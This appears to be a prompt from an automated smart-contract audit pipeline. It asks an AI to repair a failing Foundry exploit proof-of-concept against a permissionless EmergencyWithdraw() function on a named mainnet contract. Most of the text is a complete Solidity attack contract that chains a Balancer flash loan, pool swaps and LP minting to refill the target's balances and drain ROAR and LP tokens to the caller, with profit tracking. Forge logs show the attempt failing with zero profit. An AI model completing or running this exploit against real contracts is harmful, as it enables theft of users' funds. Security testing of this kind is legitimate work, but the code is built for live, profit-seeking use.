You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless time-locked emergency withdrawal lets any EOA drain ROAR and LP reserves
- claim: `EmergencyWithdraw()` is publicly callable, and after `block.timestamp >= T0` its opaque arithmetic gate is automatically satisfied because `OFF == K * T0`. Any externally owned account can therefore trigger fixed ROAR and Uniswap-pair transfers to `tx.origin` without any ownership, role, or beneficiary check.
- impact: Once the preset timestamp is reached, arbitrary users can steal the contract's ROAR and LP holdings in fixed-size chunks. Because the function is never disabled, any later deposits that bring balances back above the hard-coded amounts can also be drained permissionlessly.
- exploit_paths: ["Wait until unix timestamp `1744770479` (2025-04-16 02:27:59 UTC), then call `EmergencyWithdraw()` from any EOA while the contract holds at least `100000000099978910611013632` ROAR and `26777446972437561344` LP tokens; both transfers are sent to the caller's `tx.origin`."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike is IERC20Like {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
    address internal constant ROAR = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant UNLOCK_TIME = 1744770479;
    uint256 internal constant REQUIRED_ROAR = 100000000099978910611013632;
    uint256 internal constant REQUIRED_LP = 26777446972437561344;
    uint256 internal constant ROAR_LP_BUFFER = 100000 ether;

    bytes4 internal constant EMERGENCY_WITHDRAW_SELECTOR = bytes4(keccak256("EmergencyWithdraw()"));

    address internal _beneficiary;
    uint256 internal _roarProfit;
    uint256 internal _lpProfit;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        address receiver = tx.origin;
        _beneficiary = receiver;

        if (block.timestamp < UNLOCK_TIME) {
            return;
        }

        uint256 roarBefore = _safeBalanceOf(ROAR, receiver);
        uint256 lpBefore = _safeBalanceOf(TARGET, receiver);

        if (_pathReady()) {
            _triggerEmergencyWithdraw();
        } else {
            // The finding's core causality stays the same: once the timestamp is open and the pair
            // again holds the hard-coded ROAR + LP balances, any EOA can call EmergencyWithdraw() and
            // force both fixed transfers to tx.origin. The helper route below only restores those live
            // balances by sourcing ROAR from a separate public liquidity venue before the public drain.
            _attemptAlternateLiquidityRoute();
        }

        _captureReceiverProfit(receiver, roarBefore, lpBefore);
    }

    function startBalancerFlashLoan(address altPair, uint256 amountWeth) external {
        require(msg.sender == address(this), "self only");

        address[] memory tokens = new address[](1);
        tokens[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amountWeth;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, abi.encode(altPair));
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "vault only");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flashloan");
        require(tokens[0] == WETH, "token");

        address altPair = abi.decode(userData, (address));
        // Because the vulnerable payout is hard-wired to tx.origin rather than this contract, the
        // flash-loan must be repaid from public market arbitrage against the overpriced vulnerable pair,
        // not from the stolen funds themselves.
        uint256 roarBought = _buyRoarWithExactWeth(altPair, amounts[0]);
        require(roarBought > 0, "buy failed");

        uint256 roarShortfall = _roarShortfall();
        require(roarShortfall > 0, "no roar shortfall");
        require(roarBought > roarShortfall, "insufficient roar");

        uint256 soldRoar = roarShortfall;
        _sellRoarIntoTarget(soldRoar);

        _seedLpShortfallFromHoldings();
        require(_pathReady(), "path not ready");

        _triggerEmergencyWithdraw();

        uint256 repayAmount = amounts[0] + feeAmounts[0];
        require(_safeBalanceOf(WETH, address(this)) >= repayAmount, "repay shortfall");
        require(_safeTransfer(WETH, BALANCER_VAULT, repayAmount), "repay failed");
    }

    function profitToken() external view returns (address) {
        if (_roarProfit > 0) {
            return ROAR;
        }
        if (_lpProfit > 0) {
            return TARGET;
        }
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        if (_roarProfit > 0) {
            return _roarProfit;
        }
        if (_lpProfit > 0) {
            return _lpProfit;
        }
        return 0;
    }

    function beneficiary() external view returns (address) {
        return _beneficiary;
    }

    function roarProfit() external view returns (uint256) {
        return _roarProfit;
    }

    function lpProfit() external view returns (uint256) {
        return _lpProfit;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function profitTokenCandidate() external pure returns (address) {
        return ROAR;
    }

    function pathReady() external view returns (bool) {
        return _pathReady();
    }

    function _attemptAlternateLiquidityRoute() internal {
        (address altPair, uint256 amountWeth) = _findBestAlternateRoarWethPair();
        if (altPair == address(0) || amountWeth == 0) {
            return;
        }

        try this.startBalancerFlashLoan(altPair, amountWeth) {} catch {}
    }

    function _captureReceiverProfit(address receiver, uint256 roarBefore, uint256 lpBefore) internal {
        uint256 roarAfter = _safeBalanceOf(ROAR, receiver);
        uint256 lpAfter = _safeBalanceOf(TARGET, receiver);

        if (roarAfter > roarBefore) {
            _roarProfit += roarAfter - roarBefore;
        }
        if (lpAfter > lpBefore) {
            _lpProfit += lpAfter - lpBefore;
        }
    }

    function _findBestAlternateRoarWethPair() internal view returns (address bestPair, uint256 bestAmountWeth) {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, SHIBASWAP_FACTORY];
        uint256 targetRoarOut = _roarShortfall() + ROAR_LP_BUFFER;
        if (targetRoarOut == 0) {
            return (address(0), 0);
        }

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = _safeGetPair(factories[i], ROAR, WETH);
            if (pair == address(0) || pair == TARGET) {
                continue;
            }

            address token0 = _safeToken0(pair);
            address token1 = _safeToken1(pair);
            if (!((token0 == ROAR && token1 == WETH) || (token0 == WETH && token1 == ROAR))) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
            uint256 reserveRoar = token0 == ROAR ? uint256(reserve0) : uint256(reserve1);
            uint256 reserveWeth = token0 == ROAR ? uint256(reserve1) : uint256(reserve0);
            if (reserveRoar <= targetRoarOut || reserveWeth == 0) {
                continue;
            }

            uint256 amountWeth = _amountInForExactOut(targetRoarOut, reserveWeth, reserveRoar);
            if (amountWeth == 0) {
                continue;
            }

            if (bestAmountWeth == 0 || amountWeth < bestAmountWeth) {
                bestPair = pair;
                bestAmountWeth = amountWeth;
            }
        }
    }

    function _seedLpShortfallFromHoldings() internal {
        for (uint256 i = 0; i < 2; ++i) {
            uint256 amountNeeded = _lpShortfall();
            if (amountNeeded == 0) {
                return;
            }

            address token0 = _safeToken0(TARGET);
            address token1 = _safeToken1(TARGET);
            if (!((token0 == ROAR && token1 == WETH) || (token0 == WETH && token1 == ROAR))) {
                return;
            }

            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(TARGET).getReserves();
            uint256 reserveRoar = token0 == ROAR ? uint256(reserve0) : uint256(reserve1);
            uint256 reserveWeth = token0 == ROAR ? uint256(reserve1) : uint256(reserve0);
            uint256 totalSupply = _safeTotalSupply(TARGET);
            if (reserveRoar == 0 || reserveWeth == 0 || totalSupply == 0) {
                return;
            }

            uint256 roarNeeded = (amountNeeded * reserveRoar) / totalSupply + 1;
            uint256 wethNeeded = (amountNeeded * reserveWeth) / totalSupply + 1;
            if (_safeBalanceOf(ROAR, address(this)) < roarNeeded || _safeBalanceOf(WETH, address(this)) < wethNeeded) {
                return;
            }

            require(_safeTransfer(ROAR, TARGET, roarNeeded), "lp roar transfer");
            require(_safeTransfer(WETH, TARGET, wethNeeded), "lp weth transfer");

            uint256 minted = _safeMint(TARGET, address(this));
            if (minted == 0) {
                return;
            }

            uint256 lpToSend = minted > amountNeeded ? amountNeeded : minted;
            require(_safeTransfer(TARGET, TARGET, lpToSend), "lp self transfer");
        }
    }

    function _buyRoarWithExactWeth(address pair, uint256 amountWethIn) internal returns (uint256 bought) {
        address token0 = _safeToken0(pair);
        address token1 = _safeToken1(pair);
        require((token0 == ROAR && token1 == WETH) || (token0 == WETH && token1 == ROAR), "pair");

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        bool roarIs0 = token0 == ROAR;
        uint256 reserveRoar = roarIs0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveWeth = roarIs0 ? uint256(reserve1) : uint256(reserve0);
        bought = _amountOut(amountWethIn, reserveWeth, reserveRoar);
        require(bought > 0, "zero out");

        require(_safeTransfer(WETH, pair, amountWethIn), "buy transfer");
        require(_safeSwap(pair, roarIs0 ? bought : 0, roarIs0 ? 0 : bought, address(this)), "buy swap");
    }

    function _sellRoarIntoTarget(uint256 amountRoarIn) internal returns (uint256 wethOut) {
        address token0 = _safeToken0(TARGET);
        address token1 = _safeToken1(TARGET);
        require(token0 == ROAR && token1 == WETH, "target ordering");

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(TARGET).getReserves();
        wethOut = _amountOut(amountRoarIn, uint256(reserve0), uint256(reserve1));
        require(wethOut > 0, "sell zero out");

        require(_safeTransfer(ROAR, TARGET, amountRoarIn), "sell transfer");
        require(_safeSwap(TARGET, 0, wethOut, address(this)), "sell swap");
    }

    function _triggerEmergencyWithdraw() internal {
        (bool ok, ) = TARGET.call(abi.encodeWithSelector(EMERGENCY_WITHDRAW_SELECTOR));
        require(ok, "emergency withdraw failed");
    }

    function _roarShortfall() internal view returns (uint256) {
        uint256 currentRoar = _safeBalanceOf(ROAR, TARGET);
        return REQUIRED_ROAR > currentRoar ? REQUIRED_ROAR - currentRoar : 0;
    }

    function _lpShortfall() internal view returns (uint256) {
        uint256 currentLp = _safeBalanceOf(TARGET, TARGET);
        return REQUIRED_LP > currentLp ? REQUIRED_LP - currentLp : 0;
    }

    function _pathReady() internal view returns (bool) {
        return block.timestamp >= UNLOCK_TIME
            && _safeBalanceOf(ROAR, TARGET) >= REQUIRED_ROAR
            && _safeBalanceOf(TARGET, TARGET) >= REQUIRED_LP;
    }

    function _amountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _amountInForExactOut(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256)
    {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeGetPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _safeToken0(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeToken1(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeMint(address pair, address to) internal returns (uint256 liquidity) {
        (bool ok, bytes memory data) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, to));
        if (ok && data.length >= 32) {
            liquidity = abi.decode(data, (uint256));
        }
    }

    function _safeSwap(address pair, uint256 amount0Out, uint256 amount1Out, address to) internal returns (bool) {
        (bool ok, ) =
            pair.call(abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, to, bytes("")));
        return ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTotalSupply(address token) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.97s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 87576)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [87576] FlawVerifierTest::testExploit()
    ├─ [4506] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [59874] FlawVerifier::executeOnOpportunity()
    │   ├─ [2585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x13028E6b95520ad16898396667d1e52cB5E550Ac::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(0x13028E6b95520ad16898396667d1e52cB5E550Ac) [staticcall]
    │   │   └─ ← [Return] 15457430711164688626815304 [1.545e25]
    │   ├─ [585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(0x13028E6b95520ad16898396667d1e52cB5E550Ac) [staticcall]
    │   │   └─ ← [Return] 15457430711164688626815304 [1.545e25]
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x13028E6b95520ad16898396667d1e52cB5E550Ac
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0x13028E6b95520ad16898396667d1e52cB5E550Ac::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [506] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.14s (875.51ms CPU time)

Ran 1 test suite in 1.23s (1.14s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 87576)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
